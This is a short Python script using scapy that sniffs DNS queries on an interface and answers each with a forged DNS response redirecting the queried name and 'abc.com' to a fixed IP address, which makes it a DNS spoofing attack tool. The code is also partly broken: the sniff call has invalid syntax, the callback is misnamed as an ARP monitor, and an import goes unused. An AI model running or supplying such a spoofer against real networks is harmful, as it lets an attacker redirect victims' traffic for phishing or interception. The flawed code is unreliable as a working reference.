#! /usr/bin/env python
from scapy.all import *
import netifaces

changeToIp = "173.252.89.132"
dnsQueryDName = "abc.com"

def arp_monitor_callback(pkt):
	spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)\
		/UDP(dport=pkt[UDP].sport, sport=53)\
		/DNS(id=pkt[DNS].id,qr=1L,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=changeToIp)\
		/DNSRR(rrname=dnsQueryDName,rdata=changeToIp))
	send(spfResp,verbose=0)
	return "Spoofed DNS Response Sent"

sniff(iface=interface'eth1',prn=arp_monitor_callback, filter="port 53", store=0)

